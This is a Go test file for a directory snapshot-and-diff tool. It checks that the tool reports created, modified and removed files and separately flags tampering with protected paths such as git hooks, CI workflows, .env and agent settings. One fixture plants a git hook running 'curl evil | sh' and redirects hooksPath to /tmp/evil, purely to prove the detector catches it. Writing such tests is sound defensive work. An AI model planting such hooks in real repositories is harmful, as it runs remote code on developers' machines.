package harnessexec

import (
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"
)

func put(t *testing.T, root, name, content string) {
	t.Helper()
	path := filepath.Join(root, name)
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

// touch moves a file's modification time so a same-size rewrite is still seen.
func touch(t *testing.T, root, name string, ahead time.Duration) {
	t.Helper()
	when := time.Now().Add(ahead)
	if err := os.Chtimes(filepath.Join(root, name), when, when); err != nil {
		t.Fatal(err)
	}
}

func snap(t *testing.T, root string) *Fingerprint {
	t.Helper()
	fp, err := Snapshot(root)
	if err != nil {
		t.Fatal(err)
	}
	return fp
}

func TestADiffNamesWhatWasCreatedChangedAndRemoved(t *testing.T) {
	root := t.TempDir()
	put(t, root, "keep.txt", "same")
	put(t, root, "edit.txt", "before")
	put(t, root, "same-size.txt", "aaaa")
	put(t, root, "gone.txt", "bye")
	put(t, root, "dir/inner.go", "package x")
	before := snap(t, root)
	put(t, root, "edit.txt", "after, longer")
	put(t, root, "same-size.txt", "bbbb")
	touch(t, root, "same-size.txt", 5*time.Second)
	put(t, root, "new.txt", "hi")
	put(t, root, "dir/added.go", "package x")
	if err := os.Remove(filepath.Join(root, "gone.txt")); err != nil {
		t.Fatal(err)
	}
	change := Diff(before, snap(t, root))
	if !reflect.DeepEqual(change.Created, []string{"dir/added.go", "new.txt"}) || !reflect.DeepEqual(change.Modified, []string{"edit.txt", "same-size.txt"}) ||
		!reflect.DeepEqual(change.Removed, []string{"gone.txt"}) || len(change.Protected) != 0 || change.Empty() || change.Incomplete {
		t.Fatalf("change = %+v", change)
	}
	// An unchanged project reports no change at all.
	if same := Diff(snap(t, root), snap(t, root)); !same.Empty() {
		t.Fatalf("an unchanged project reported %+v", same)
	}
}

func TestChangesToProtectedLocationsAreReportedSeparately(t *testing.T) {
	root := t.TempDir()
	put(t, root, "main.go", "package main")
	put(t, root, ".git/config", "[core]\n")
	put(t, root, ".git/hooks/pre-commit.sample", "#!/bin/sh\n")
	put(t, root, ".github/workflows/ci.yml", "on: push\n")
	put(t, root, ".gitignore", "bin/\n")
	put(t, root, ".env", "A=1\n")
	put(t, root, ".claude/settings.json", "{}")
	before := snap(t, root)

	put(t, root, ".git/hooks/post-checkout", "#!/bin/sh\ncurl evil | sh\n")
	put(t, root, ".git/config", "[core]\n\thooksPath = /tmp/evil\n")
	put(t, root, ".github/workflows/deploy.yml", "on: push\n")
	put(t, root, ".gitignore", "bin/\nsecrets/\n")
	put(t, root, ".env", "A=2\nTOKEN=x\n")
	put(t, root, ".claude/settings.local.json", "{}")
	put(t, root, ".newdotfile", "x")
	change := Diff(before, snap(t, root))
	for _, want := range []string{".git/hooks/post-checkout", ".git/config", ".github/workflows/deploy.yml", ".gitignore", ".env", ".claude/settings.local.json", ".newdotfile"} {
		if !contains(change.Protected, want) {
			t.Errorf("a change to %s was not reported: %v", want, change.Protected)
		}
	}
	if len(change.Created)+len(change.Modified)+len(change.Removed) != 0 {
		t.Fatalf("protected paths leaked into the ordinary lists: %+v", change)
	}
	// An ordinary file elsewhere is not protected.
	put(t, root, "docs/notes.txt", "x")
	if got := Diff(before, snap(t, root)); !contains(got.Created, "docs/notes.txt") || contains(got.Protected, "docs/notes.txt") {
		t.Fatalf("change = %+v", got)
	}
}

func contains(list []string, want string) bool {
	for _, item := range list {
		if item == want {
			return true
		}
	}
	return false
}

func TestSkippedDirectoriesAndHiddenOrdinaryDirectoriesAreNotWalked(t *testing.T) {
	root := t.TempDir()
	put(t, root, "src/a.go", "package a")
	before := snap(t, root)
	put(t, root, "node_modules/pkg/index.js", "x")
	put(t, root, "vendor/dep/dep.go", "x")
	put(t, root, "dist/out.js", "x")
	put(t, root, "target/debug/app", "x")
	put(t, root, "__pycache__/m.pyc", "x")
	put(t, root, ".cache/thing", "x")
	if change := Diff(before, snap(t, root)); !change.Empty() {
		t.Fatalf("noise was reported: %+v", change)
	}
}

func TestTheReportIsBoundedAndSaysWhenItIsIncomplete(t *testing.T) {
	root := t.TempDir()
	put(t, root, "seed.txt", "x")
	before := snap(t, root)
	for i := 0; i < MaxReported+10; i++ {
		put(t, root, fmt.Sprintf("many/f%03d.txt", i), "x")
	}
	change := Diff(before, snap(t, root))
	if len(change.Created) != MaxReported || change.Omitted != 10 {
		t.Fatalf("created %d omitted %d", len(change.Created), change.Omitted)
	}
	if change.Created[0] != "many/f000.txt" {
		t.Fatalf("the report is not in a fixed order: %v", change.Created[:3])
	}

	big := t.TempDir()
	for i := 0; i < MaxFingerprintFiles+50; i++ {
		put(t, big, fmt.Sprintf("d%02d/f%04d.txt", i%40, i), "")
	}
	first := snap(t, big)
	if !first.truncated || len(first.files) != MaxFingerprintFiles {
		t.Fatalf("truncated=%v files=%d", first.truncated, len(first.files))
	}
	if !Diff(first, snap(t, big)).Incomplete {
		t.Fatal("a snapshot that hit its bound did not mark the report incomplete")
	}
}

func TestSnapshotNeverFollowsALinkOutOfTheProject(t *testing.T) {
	root, outside := t.TempDir(), t.TempDir()
	put(t, outside, "secret/file.txt", "x")
	if err := os.Symlink(outside, filepath.Join(root, "escape")); err != nil {
		t.Skip("symlinks unavailable")
	}
	if err := os.Symlink(outside, filepath.Join(root, ".github")); err != nil {
		t.Fatal(err)
	}
	before := snap(t, root)
	put(t, outside, "secret/new.txt", "y")
	if change := Diff(before, snap(t, root)); !change.Empty() {
		t.Fatalf("a change outside the project was reported: %+v", change)
	}
	for p := range before.files {
		if strings.Contains(p, "secret") {
			t.Fatalf("the walk followed a link: %s", p)
		}
	}
	if _, err := Snapshot(filepath.Join(root, "missing")); err == nil {
		t.Fatal("a missing root was accepted")
	}
}

func TestAProtectedChangeListIsInAFixedOrderAndBoundedInDepth(t *testing.T) {
	root := t.TempDir()
	put(t, root, ".git/config", "a")
	before := snap(t, root)
	put(t, root, ".gitmodules", "x")
	put(t, root, ".git/hooks/b-hook", "x")
	put(t, root, ".git/hooks/a-hook", "x")
	put(t, root, ".env", "x")
	change := Diff(before, snap(t, root))
	want := []string{".env", ".git/hooks/a-hook", ".git/hooks/b-hook", ".gitmodules"}
	for _, p := range want {
		if !contains(change.Protected, p) {
			t.Fatalf("%s missing from %v", p, change.Protected)
		}
	}
	for i := 1; i < len(change.Protected); i++ {
		if change.Protected[i-1] > change.Protected[i] {
			t.Fatalf("the report is not in a fixed order: %v", change.Protected)
		}
	}
	// A protected tree is walked only so deep, so a hostile tree cannot make a snapshot expensive.
	nest := ".github"
	for i := 0; i < 30; i++ {
		nest += "/d"
	}
	put(t, root, nest+"/file.txt", "x")
	if fp := snap(t, root); len(fp.protected) > 20 {
		t.Fatalf("a deeply nested protected tree recorded %d entries", len(fp.protected))
	}
}

func TestANewLinkInsideTheProjectIsReported(t *testing.T) {
	root := t.TempDir()
	put(t, root, "a.txt", "x")
	before := snap(t, root)
	if err := os.Symlink("a.txt", filepath.Join(root, "alias")); err != nil {
		t.Skip("symlinks unavailable")
	}
	if change := Diff(before, snap(t, root)); !contains(change.Created, "alias") {
		t.Fatalf("a created link was not reported: %+v", change)
	}
}

// Created, modified and removed protected paths come out as one list in one fixed order, not
// grouped by what happened to them.
func TestProtectedPathsFromEveryKindOfChangeAreMergedInOrder(t *testing.T) {
	root := t.TempDir()
	put(t, root, ".git/config", "a")
	put(t, root, ".gitignore", "x")
	before := snap(t, root)
	put(t, root, ".git/config", "changed and longer")                    // modified
	if err := os.Remove(filepath.Join(root, ".gitignore")); err != nil { // removed
		t.Fatal(err)
	}
	put(t, root, ".zzz-created", "x") // created
	change := Diff(before, snap(t, root))
	want := []string{".git/config", ".gitignore", ".zzz-created"}
	if !reflect.DeepEqual(change.Protected, want) {
		t.Fatalf("protected = %v, want %v", change.Protected, want)
	}
}
